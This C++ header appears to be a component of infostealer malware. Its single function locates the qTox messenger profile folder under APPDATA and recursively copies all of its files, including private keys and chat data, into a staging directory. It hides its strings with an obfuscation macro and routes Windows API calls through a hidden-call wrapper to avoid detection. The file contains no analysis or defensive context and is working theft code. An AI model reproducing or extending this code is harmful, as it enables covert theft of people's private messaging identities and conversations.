#ifndef QTOX_HPP
#define QTOX_HPP

#include <string>
#include <filesystem>
#include <cstdlib>
#include "Winapi_structs.hpp"
#include "obfusheader.h"
namespace fs = std::filesystem;

namespace QTox {
    inline void Extract(const std::string& baseDir) {
        char* appdataPath = nullptr;
        size_t requiredSize = 0;
        _dupenv_s(&appdataPath, &requiredSize, OBF("APPDATA"));

        if (!appdataPath) return;

        std::string toxDir = std::string(appdataPath) + OBF("\\Tox");
        free(appdataPath);

        if (!fs::exists(toxDir)) return;

        std::string targetDir = baseDir + OBF("\\QTox");
        HiddenCalls::CreateDirectoryA(targetDir.c_str(), NULL);

        for (const auto& entry : fs::recursive_directory_iterator(toxDir)) {
            std::string destPath = targetDir + "\\" + entry.path().filename().string();
            if (fs::is_directory(entry)) {
                HiddenCalls::CreateDirectoryA(destPath.c_str(), NULL);
            }
            else {
                HiddenCalls::CopyFileA(entry.path().string().c_str(), destPath.c_str(), FALSE);
            }
        }
    }
}

#endif
